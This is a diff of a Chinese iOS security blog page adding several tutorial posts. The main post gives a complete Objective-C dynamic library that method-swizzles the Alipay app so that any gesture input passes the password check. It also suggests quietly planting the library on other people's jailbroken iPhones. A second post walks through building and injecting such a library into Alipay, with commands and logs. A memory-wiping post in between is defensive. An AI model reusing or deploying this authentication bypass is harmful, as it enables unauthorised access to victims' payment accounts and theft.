@@ -7,9 +7,7 @@
 	<meta name="author" content="Rick">
 
 	
-	<meta name="description" content="10 二进制和资源文件自检 我们把自己的程序发布到 app store，但是不能保证每一个用户都是从 app store 下载官方 app，也不能保证每一个用户都不越狱。
-换句话说，我们无法保证程序运行环境在 MAC 管控策略下就绝对的安全。
-所以，在有些情况下，尤其是和钱有关系的 app ， &hellip;">
+	<meta name="description" content="14 Hack 实战——支付宝 App 手势密码校验欺骗 在 iOS 安全攻防（十一）：Hack实战——探究支付宝 app 手势密码中，介绍了如何利用 gdb 分析 app ，确定了支付宝 app 的手势密码格式为字符串，9 个点分别对应 123456789。在 iOS 安全攻防（十二）： &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -77,6 +75,619 @@
 		
 	
 	<div id="content" class="inner">
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/Blog/blog/2016/08/25/hack-shi-zhan-zhi-fu-bao-app-shou-shi-mi-ma-xiao-yan-qi-pian/">
+		
+			Hack 实战——支付宝 App 手势密码校验欺骗</a>
+	</h2>
+	<div class="entry-content">
+		<div class="container">
+<div class="item chapter">
+    <h1 class="title"><span class="label">14</span> <span class="title">Hack 实战——支付宝 App 手势密码校验欺骗</span></h1>
+    <p>在 <a href="/Blog/blog/2016/08/25/hackshi-zhan-tan-jiu-zhi-fu-bao-app-shou-shi-mi-ma/">iOS 安全攻防（十一）：Hack实战——探究支付宝 app 手势密码</a>中，介绍了如何利用 gdb 分析 app ，确定了支付宝 app 的手势密码格式为字符串，9 个点分别对应 123456789。在 <a href="/Blog/blog/2016/08/25/ios7-de-dong-tai-ku-zhu-ru/">iOS 安全攻防（十二）：iOS7 的动态库注入</a>中，介绍了如果利用越狱大神们为我们开辟的 iOS7 动态库注入方法。</p>
+
+<p>本文将继续深入 hack 实战，hook 支付宝手势密码校验操作，欺骗其通过任意手势输入。</p>
+
+<p>那么到现在为止，我们已经掌握了什么信息呢？</p>
+
+<p>1）一个名叫<code> GestureUnlockViewController </code>的类，含有<code> gestureInputView:didFinishWithPassword:  </code>方法，来处理输入的手势</p>
+
+<p>2）正确的手势密码通过一个名叫<code> GestureUtil </code>的类读取，方法是<code> getPassword</code></p>
+
+<p>思路马上清晰了，我们需要做 2 步：</p>
+
+<p>1）hook <code>getPassword </code>存下正确的密码</p>
+
+<p>2）hook <code>gestureInputView:didFinishWithPassword: </code> 替换当前输入为正确的密码</p>
+
+<p>一个关键点，我们是用<code> Method Swizzling </code>来 hook，那么就意味操作不能过早，因为我们要保证在取到  <code>GestureUnlockViewController </code>和<code> GestureUtil class </code>后，才能进行 imp 替换。</p>
+
+<p>所以， 我采用<code> NSNotificationCenter </code>通知机制协助完成任务。</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+<span class="line-number">26</span>
+<span class="line-number">27</span>
+<span class="line-number">28</span>
+<span class="line-number">29</span>
+<span class="line-number">30</span>
+<span class="line-number">31</span>
+<span class="line-number">32</span>
+<span class="line-number">33</span>
+<span class="line-number">34</span>
+<span class="line-number">35</span>
+<span class="line-number">36</span>
+<span class="line-number">37</span>
+<span class="line-number">38</span>
+<span class="line-number">39</span>
+<span class="line-number">40</span>
+<span class="line-number">41</span>
+<span class="line-number">42</span>
+<span class="line-number">43</span>
+<span class="line-number">44</span>
+<span class="line-number">45</span>
+<span class="line-number">46</span>
+<span class="line-number">47</span>
+<span class="line-number">48</span>
+<span class="line-number">49</span>
+<span class="line-number">50</span>
+<span class="line-number">51</span>
+<span class="line-number">52</span>
+<span class="line-number">53</span>
+<span class="line-number">54</span>
+<span class="line-number">55</span>
+<span class="line-number">56</span>
+<span class="line-number">57</span>
+<span class="line-number">58</span>
+<span class="line-number">59</span>
+<span class="line-number">60</span>
+<span class="line-number">61</span>
+<span class="line-number">62</span>
+<span class="line-number">63</span>
+<span class="line-number">64</span>
+<span class="line-number">65</span>
+<span class="line-number">66</span>
+<span class="line-number">67</span>
+<span class="line-number">68</span>
+<span class="line-number">69</span>
+<span class="line-number">70</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="cp">#import &lt;objc/runtime.h&gt;  </span>
+</span><span class="line"> <span class="err">#</span><span class="n">import</span> <span class="o">&lt;</span><span class="n">UIKit</span><span class="o">/</span><span class="n">UIKit</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">IMP</span> <span class="n">ori_getPasswd_IMP</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span><span class="line"><span class="n">IMP</span> <span class="n">ori_gesture_IMP</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@interface</span> <span class="nc">NSObject</span> <span class="nl">(HackPortal)</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@end</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@implementation</span> <span class="nc">NSObject</span> <span class="nl">(HackPortal)</span>
+</span><span class="line">
+</span><span class="line"><span class="k">+</span> <span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nf">getPassword</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="n">NSString</span> <span class="o">*</span><span class="n">passwd</span> <span class="o">=</span> <span class="n">ori_getPasswd_IMP</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="n">getPassword</span><span class="p">));</span>
+</span><span class="line">    <span class="k">return</span> <span class="n">passwd</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">-</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">gestureInputView:</span><span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nv">view</span> <span class="nf">didFinishWithPassword:</span><span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nv">password</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="n">password</span> <span class="o">=</span> <span class="n">ori_getPasswd_IMP</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="n">getPassword</span><span class="p">));</span>
+</span><span class="line">    <span class="n">ori_gesture_IMP</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="nl">gestureInputView:didFinishWithPassword:</span><span class="p">),</span> <span class="n">view</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@end</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@implementation</span> <span class="nc">PortalListener</span>
+</span><span class="line">
+</span><span class="line"><span class="k">-</span> <span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nf">init</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="n">self</span> <span class="o">=</span> <span class="p">[</span><span class="n">super</span> <span class="n">init</span><span class="p">];</span>
+</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="n">self</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">        <span class="p">[[</span><span class="n">NSNotificationCenter</span> <span class="n">defaultCenter</span><span class="p">]</span><span class="nl">addObserver:</span><span class="n">self</span>
+</span><span class="line">                                                <span class="nl">selector:</span><span class="k">@selector</span><span class="p">(</span><span class="nl">appLaunched:</span><span class="p">)</span>
+</span><span class="line">                                                    <span class="nl">name:</span><span class="n">UIApplicationDidBecomeActiveNotification</span>
+</span><span class="line">                                                  <span class="nl">object:</span><span class="nb">nil</span><span class="p">];</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line">    <span class="k">return</span> <span class="n">self</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">-</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">appLaunched:</span><span class="p">(</span><span class="n">NSNotification</span> <span class="o">*</span><span class="p">)</span><span class="nv">notification</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="n">Class</span> <span class="n">class_GestureUtil</span> <span class="o">=</span> <span class="n">NSClassFromString</span><span class="p">(</span><span class="s">@&quot;GestureUtil&quot;</span><span class="p">);</span>
+</span><span class="line">    <span class="n">Class</span> <span class="n">class_PortalListener</span> <span class="o">=</span> <span class="n">NSClassFromString</span><span class="p">(</span><span class="s">@&quot;PortalListener&quot;</span><span class="p">);</span>
+</span><span class="line">    <span class="n">Method</span> <span class="n">ori_Method</span> <span class="o">=</span> <span class="n">class_getClassMethod</span><span class="p">(</span><span class="n">class_GestureUtil</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="n">getPassword</span><span class="p">));</span>
+</span><span class="line">    <span class="n">ori_getPasswd_IMP</span> <span class="o">=</span> <span class="n">method_getImplementation</span><span class="p">(</span><span class="n">ori_Method</span><span class="p">);</span>
+</span><span class="line">    <span class="n">Method</span> <span class="n">my_Method</span> <span class="o">=</span> <span class="n">class_getClassMethod</span><span class="p">(</span><span class="n">class_PortalListener</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="n">getPassword</span><span class="p">));</span>
+</span><span class="line">    <span class="n">method_exchangeImplementations</span><span class="p">(</span><span class="n">ori_Method</span><span class="p">,</span> <span class="n">my_Method</span><span class="p">);</span>
+</span><span class="line">
+</span><span class="line">    <span class="n">Class</span> <span class="n">class_Gesture</span> <span class="o">=</span> <span class="n">NSClassFromString</span><span class="p">(</span><span class="s">@&quot;GestureUnlockViewController&quot;</span><span class="p">);</span>
+</span><span class="line">    <span class="n">Method</span> <span class="n">ori_Method1</span> <span class="o">=</span> <span class="n">class_getInstanceMethod</span><span class="p">(</span><span class="n">class_Gesture</span><span class="p">,</span>
+</span><span class="line">                                                 <span class="k">@selector</span><span class="p">(</span><span class="nl">gestureInputView:didFinishWithPassword:</span><span class="p">));</span>
+</span><span class="line">    <span class="n">ori_gesture_IMP</span> <span class="o">=</span> <span class="n">method_getImplementation</span><span class="p">(</span><span class="n">ori_Method1</span><span class="p">);</span>
+</span><span class="line">    <span class="n">Method</span> <span class="n">my_Method1</span> <span class="o">=</span> <span class="n">class_getInstanceMethod</span><span class="p">(</span><span class="n">class_PortalListener</span><span class="p">,</span>
+</span><span class="line">                                                <span class="k">@selector</span><span class="p">(</span><span class="nl">gestureInputView:didFinishWithPassword:</span><span class="p">));</span>
+</span><span class="line">    <span class="n">method_exchangeImplementations</span><span class="p">(</span><span class="n">ori_Method1</span><span class="p">,</span> <span class="n">my_Method1</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">-</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">dealloc</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="p">[[</span><span class="n">NSNotificationCenter</span> <span class="n">defaultCenter</span><span class="p">]</span><span class="nl">removeObserver:</span><span class="n">self</span><span class="p">];</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@end</span>
+</span><span class="line">
+</span><span class="line"><span class="k">static</span> <span class="kt">void</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="n">initialize</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="k">static</span> <span class="n">PortalListener</span> <span class="o">*</span><span class="n">entrance</span><span class="p">;</span>
+</span><span class="line">    <span class="n">entrance</span> <span class="o">=</span> <span class="p">[[</span><span class="n">PortalListener</span> <span class="n">alloc</span><span class="p">]</span><span class="n">init</span><span class="p">];</span>
+</span><span class="line"><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>OK！编译好动态库，塞进 iPhone 试试效果吧～</p>
+
+<p>不管我们输入什么手势，都会被替换为正确的密码去给<code>     gestureInputView:didFinishWithPassword: </code>验证，然后顺利解锁。</p>
+
+<p>这意味着什么呢？</p>
+
+<p>意味着，我们可以通过正规的渠道让用户下载这个动态库，然后悄悄放进越狱的 iPhone 的 <code>/Library/MobileSubstrate/DynamicLibraries/</code> 目录下……然后……然后去给妹纸帅锅变魔术吧：“你看，我和你多心有灵犀，你改什么密码我都猜的到!”</p>
+
+</div>
+</div>
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+</div>
+	<div class="tags">
+
+
+	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/Blog/blog/2016/08/25/hack-shi-zhan-zhi-fu-bao-app-shou-shi-mi-ma-xiao-yan-qi-pian/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/Blog/blog/2016/08/25/shu-ju-ca-chu/">
+		
+			数据擦除</a>
+	</h2>
+	<div class="entry-content">
+		<div class="container">
+<div class="item chapter">
+    <h1 class="title"><span class="label">13</span> <span class="title">数据擦除</span></h1>
+    <p>对于敏感数据，我们不希望长时间放在内存中，而希望使用完后立即就被释放掉。</p>
+
+<p>但是不管是<code> ARC </code>还是<code> MRC</code>，自动释放池也有轮循工作周期，我们都无法控制内存数据被擦除的准确时间，让 hackers 们有机可乘。
+本文介绍一个小技巧——及时数据擦除。</p>
+
+<p>假如一个 View Controller A的一个数据被绑在一个 property 上，</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="k">@interface</span> <span class="nc">WipingMemoryViewController</span> : <span class="nc">UIViewController</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@property</span> <span class="p">(</span><span class="n">nonatomic</span><span class="p">,</span><span class="n">copy</span><span class="p">)</span> <span class="n">NSString</span><span class="o">*</span> <span class="n">text</span><span class="p">;</span>
+</span><span class="line"><span class="k">@end</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>当 A push 到另外一个 View Controller B 时，该数据还是有可能被读到的</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="n">WipingMemoryViewController</span> <span class="o">*</span><span class="n">lastController</span> <span class="o">=</span> <span class="p">(</span><span class="n">WipingMemoryViewController</span> <span class="o">*</span><span class="p">)</span><span class="n">self</span><span class="p">.</span><span class="n">navigationController</span><span class="p">.</span><span class="n">viewControllers</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span><span class="line"><span class="n">NSLog</span><span class="p">(</span><span class="s">@&quot;text = %@&quot;</span><span class="p">,</span><span class="n">lastController</span><span class="p">.</span><span class="n">text</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>于是，“用后即擦”变得十分必要：</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="n">_text</span> <span class="o">=</span> <span class="p">[[</span><span class="n">NSString</span> <span class="n">alloc</span><span class="p">]</span><span class="nl">initWithFormat:</span><span class="s">@&quot;information&quot;</span><span class="p">];</span>
+</span><span class="line"><span class="n">NSLog</span><span class="p">(</span><span class="s">@&quot;Origal string = %@&quot;</span><span class="p">,</span><span class="n">_text</span><span class="p">);</span>
+</span><span class="line"><span class="c1">//do something...  </span>
+</span><span class="line"><span class="n">charchar</span> <span class="o">*</span><span class="n">string</span> <span class="o">=</span> <span class="p">(</span><span class="n">charchar</span> <span class="o">*</span><span class="p">)</span><span class="n">CFStringGetCStringPtr</span><span class="p">((</span><span class="n">CFStringRef</span><span class="p">)</span><span class="n">_text</span><span class="p">,</span> <span class="n">CFStringGetSystemEncoding</span><span class="p">());</span>
+</span><span class="line"><span class="n">memset</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">[</span><span class="n">_text</span> <span class="n">length</span><span class="p">]);</span>
+</span><span class="line"><span class="n">NSLog</span><span class="p">(</span><span class="s">@&quot;final text = %@&quot;</span><span class="p">,</span><span class="n">_text</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>Log 输出如下：</p>
+
+<div class="code code">
+<pre class="code">WipingMemory[2518:70b] Origal string = information  
+WipingMemory[2518:70b] final text =</pre>
+</div>
+
+<p>可以看到，我们想要保护的数据，被有效的擦除了。</p>
+
+<p>还有提个醒，如果是这样</p>
+
+<p><code>_text = @"information";</code></p>
+
+<p>创建的字符串，是会被分配到 data 区，而是无法修改的。</p>
+
+<p>如果有兴趣也有闲心，可以试试运行下面的代码，有彩蛋哦：</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="n">_text</span> <span class="o">=</span> <span class="s">@&quot;information&quot;</span><span class="p">;</span>
+</span><span class="line"><span class="n">memset</span><span class="p">((</span><span class="n">__bridge</span> <span class="n">voidvoid</span> <span class="o">*</span><span class="p">)(</span><span class="n">_text</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">_text</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class="line"><span class="n">NSString</span> <span class="o">*</span><span class="n">myString</span> <span class="o">=</span> <span class="p">[[</span><span class="n">NSString</span> <span class="n">alloc</span><span class="p">]</span><span class="nl">initWithFormat:</span><span class="s">@&quot;information&quot;</span><span class="p">];</span>
+</span><span class="line"><span class="n">NSLog</span><span class="p">(</span><span class="s">@&quot;Origal text : %@ </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">myString</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>编译器把两个 information 的省略到一个地址了～</p>
+
+</div>
+</div>
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+</div>
+	<div class="tags">
+
+
+	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/Blog/blog/2016/08/25/shu-ju-ca-chu/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/Blog/blog/2016/08/25/ios7-de-dong-tai-ku-zhu-ru/">
+		
+			iOS7 的动态库注入</a>
+	</h2>
+	<div class="entry-content">
+		<div class="container">
+<div class="item chapter">
+    <h1 class="title"><span class="label">12</span> <span class="title">iOS7 的动态库注入</span></h1>
+    <p>iOS 系统不断升级，结构不断调整，所以我们可以利用的动态库注入方法也根据系统版本的不同而不同。</p>
+
+<p>在此之前，我们可以利用环境变量 <code>DYLD_INSERT_LIBRARY</code> 来添加动态库，iOS7 被成功越狱后，我们需要自己去探索实践 iOS7 动态库注入的方式。</p>
+
+<p>本文将在 iOS7.0.4 环境下，以 hook 支付宝 app 程序中 <code> ALPLauncherController </code>的视图加载方法为例，介绍在 iOS7 下，如何实现动态库注入攻击。</p>
+
+<h3>相关工具位置信息</h3>
+
+<p>先总结罗列一下相关编译、链接工具的位置路径信息，在各位自行下载的 iOS SDK中</p>
+
+<div class="code code">
+<pre class="code">clang :    /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang
+gcc :    /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/arm-apple-darwin10-llvm-gcc-4.2
+ld :   /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/ld
+                /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/ld
+sdk  :   /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS7.0.sdk/</pre>
+</div>
+
+<h3>动态库源程序</h3>
+
+<p>我们编写一个 hook 支付宝 app 程序中 ALPLauncherController  的 viewDidLoad 方法，具体方法是利用 Method Swizzling 。</p>
+
+<p>不熟悉 Method Swizzling 的话，可以参看我的这篇文章：<a href="/Blog/blog/2016/08/26/method-swizzling/">Method Swizzling</a></p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="cp">#import &lt;UIKit/UIKit.h&gt;  </span>
+</span><span class="line"> <span class="err">#</span><span class="n">import</span> <span class="o">&lt;</span><span class="n">objc</span><span class="o">/</span><span class="n">runtime</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@implementation</span> <span class="nc">UIViewController</span> <span class="nl">(HookPortal)</span>
+</span><span class="line">
+</span><span class="line"><span class="k">-</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">myViewDidLoad</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="n">NSLog</span><span class="p">(</span><span class="s">@&quot;----------------------- myViewDidLoad ----------------------&quot;</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span>
+</span><span class="line">
+</span><span class="line"><span class="k">@end</span>
+</span><span class="line">
+</span><span class="line"><span class="k">static</span> <span class="kt">void</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="n">initialize</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class="line"><span class="p">{</span>
+</span><span class="line">    <span class="n">NSLog</span><span class="p">(</span><span class="s">@&quot;======================= initialize ========================&quot;</span><span class="p">);</span>
+</span><span class="line">
+</span><span class="line">    <span class="n">Class</span> <span class="n">class</span> <span class="o">=</span> <span class="n">objc_getClass</span><span class="p">(</span><span class="s">&quot;ALPLauncherController&quot;</span><span class="p">);</span>
+</span><span class="line">    <span class="n">Method</span> <span class="n">ori_Method</span> <span class="o">=</span>  <span class="n">class_getInstanceMethod</span><span class="p">(</span><span class="n">class</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="n">viewDidLoad</span><span class="p">));</span>
+</span><span class="line">    <span class="n">Method</span> <span class="n">my_Method</span> <span class="o">=</span> <span class="n">class_getInstanceMethod</span><span class="p">(</span><span class="n">class</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="n">myViewDidLoad</span><span class="p">));</span>
+</span><span class="line">    <span class="n">method_exchangeImplementations</span><span class="p">(</span><span class="n">ori_Method</span><span class="p">,</span> <span class="n">my_Method</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<h3>编译 dylib</h3>
+
+<p>我们可以利用 xcode 直接帮忙编译 .o，或者自己手动使用 clang 编译，然后手动 ld ：</p>
+
+<div class="code code">
+<pre class="code">ld -dylib -lsystem -lobjc  -syslibroot /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS7.0.sdk/ -o libwq.dylib xxx.o</pre>
+</div>
+
+<h3>安置、验证 dylib</h3>
+
+<p>将编译好的 libwq.dylib 拷贝到 iPhone 文件系统中 <code>/Library/MobileSubstrate/DynamicLibraries/</code> 下</p>
+
+<p>如果不放心库是否能正常工作，可以加一步验证操作，写一个 demo 尝试打开自己的库：</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="n">voidvoid</span> <span class="o">*</span><span class="n">handle</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">dlopen</span><span class="p">(</span><span class="s">&quot;/Library/MobileSubstrate/DynamicLibraries/libwq.dylib&quot;</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">);</span>
+</span><span class="line"><span class="n">handle</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="s">&quot;myViewDidLoad&quot;</span><span class="p">);</span>
+</span><span class="line"><span class="k">if</span> <span class="p">(</span><span class="n">handle</span><span class="p">)</span> <span class="p">{</span>
+</span><span class="line">    <span class="n">NSLog</span><span class="p">(</span><span class="s">@&quot;++++&quot;</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span><span class="line">    <span class="n">NSLog</span><span class="p">(</span><span class="s">@&quot;----&quot;</span><span class="p">);</span>
+</span><span class="line"><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<h3>运行检验效果</h3>
+
+<p>到了验证效果的时候，重启设备后者执行：
+<code>killall SpringBoard</code></p>
+
+<p>启动支付宝 app，然后观察 log 信息：</p>
+
+<div class="code code">
+<pre class="code">Portal[3631] &lt;Notice&gt;: MS:Notice: Injecting: com.alipay.iphoneclient `[Portal] (847.21)`  
+Portal[3631] &lt;Notice&gt;: MS:Notice: Loading: /Library/MobileSubstrate/DynamicLibraries/libwq.dylib  
+Portal[3631] &lt;Warning&gt;: ======================= initialize ========================  
+Portal[3631] &lt;Warning&gt;: ----------------------- myViewDidLoad ----------------------</pre>
+</div>
+
+<p>证明我们的动态库已经被加载， 我们的 Hook 也成功了。
+剩下的就要自己去思考了，除了加句无聊的 Log，我们还可以做点什么呢？</p>
+
+</div>
+</div>
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+</div>
+	<div class="tags">
+
+
+	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/Blog/blog/2016/08/25/ios7-de-dong-tai-ku-zhu-ru/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/Blog/blog/2016/08/25/hackshi-zhan-tan-jiu-zhi-fu-bao-app-shou-shi-mi-ma/">
+		
+			Hack实战——探究支付宝 App 手势密码</a>
+	</h2>
+	<div class="entry-content">
+		<div class="container">
+<div class="item chapter">
+    <h1 class="title"><span class="label">11</span> <span class="title">Hack 实战——探究支付宝 App 手势密码</span></h1>
+    <p>在之前的 <a href="/Blog/blog/2016/08/25/hack-shi-zhan-jie-chu-zhi-fu-bao-shou-shi-jie-suo-ci-shu-xian-zhi/">iOS安全攻防（七）：Hack实战——解除支付宝app手势解锁错误次数限制</a>中，留了一个问题，就是如何破解手势密码。</p>
+
+<p>方法不唯一，本文介绍如何利用 gdb 分析破解 App 。</p>
+
+<p>当没有程序源代码的情况下，我们如何利用 gdb 呢？</p>
+
